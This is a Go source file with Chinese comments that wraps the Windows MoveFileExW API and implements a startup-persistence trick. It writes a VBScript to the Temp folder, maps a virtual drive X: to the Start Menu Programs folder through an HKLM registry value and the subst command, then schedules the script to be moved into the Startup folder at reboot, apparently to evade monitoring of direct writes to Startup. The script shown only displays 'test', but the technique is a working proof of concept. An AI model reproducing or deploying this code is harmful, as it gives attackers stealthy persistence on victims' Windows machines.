package util

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

// MoveFileFlags 定义了文件移动标志位的枚举。
type MoveFileFlags uint32

const (
	MOVEFILE_REPLACE_EXISTING      MoveFileFlags = 0x00000001
	MOVEFILE_COPY_ALLOWED          MoveFileFlags = 0x00000002
	MOVEFILE_DELAY_UNTIL_REBOOT    MoveFileFlags = 0x00000004
	MOVEFILE_WRITE_THROUGH         MoveFileFlags = 0x00000008
	MOVEFILE_CREATE_HARDLINK       MoveFileFlags = 0x00000010
	MOVEFILE_FAIL_IF_NOT_TRACKABLE MoveFileFlags = 0x00000020
)

var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	procMoveFileExW = kernel32.NewProc("MoveFileExW")
)

// MoveFileEx 封装了Windows API 函数 MoveFileEx。
// 该函数用于移动文件并设置特定标志位。
func MoveFileEx(lpExistingFileName, lpNewFileName string, dwFlags MoveFileFlags) bool {
	ret, _, _ := procMoveFileExW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpExistingFileName))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpNewFileName))),
		uintptr(dwFlags),
	)

	return ret != 0
}

// MoveFileWithSubst 执行文件移动和虚拟驱动器创建的操作。
func MoveFileWithSubst() error {
	// 创建1.vbs文件
	vbsContent := []byte("msgbox(\"test\")")
	err := ioutil.WriteFile("C:\\Windows\\Temp\\1.vbs", vbsContent, 0644)
	if err != nil {
		return fmt.Errorf("无法创建1.vbs文件: %v", err)
	}

	// 定义新的磁盘符号和文件路径
	newDisk := "X:"
	filePath := "C:\\Windows\\Temp\\1.vbs"
	filename := "1.vbs"

	// 获取程序数据目录和程序启动目录
	appData := os.Getenv("APPDATA")
	programs := appData + "\\Microsoft\\Windows\\Start Menu\\Programs"

	// 设置新磁盘符号到程序启动目录的映射
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices`, registry.WRITE)
	if err != nil {
		fmt.Println("无法打开注册表键")
		return fmt.Errorf("无法打开注册表键: %v", err)
	}
	defer key.Close()

	err = key.SetStringValue(newDisk, "\\??\\"+programs)
	if err != nil {
		fmt.Println("无法设置注册表值")
		return fmt.Errorf("无法设置注册表值: %v", err)
	}

	// 使用substitute命令创建虚拟驱动器
	substCmd := exec.Command("subst", newDisk, programs)
	err = substCmd.Run()
	if err != nil {
		fmt.Println("无法创建虚拟驱动器")
		return fmt.Errorf("无法创建虚拟驱动器: %v", err)
	}

	// 复制文件到程序启动目录
	destPath := programs + "\\" + filename
	err = CopyFile(filePath, destPath)
	if err != nil {
		fmt.Println("无法复制文件")
		return fmt.Errorf("无法复制文件: %v", err)
	}

	// 使用MoveFileEx函数将文件移动到启动目录并设置延迟重启标志
	success := MoveFileEx(newDisk+"\\"+filename, newDisk+"\\Startup\\"+filename, MOVEFILE_DELAY_UNTIL_REBOOT)
	if !success {
		fmt.Println("无法移动文件")
		return fmt.Errorf("无法移动文件")
	}

	return nil
}

// CopyFile 复制源文件到目标文件
func CopyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	return nil
}
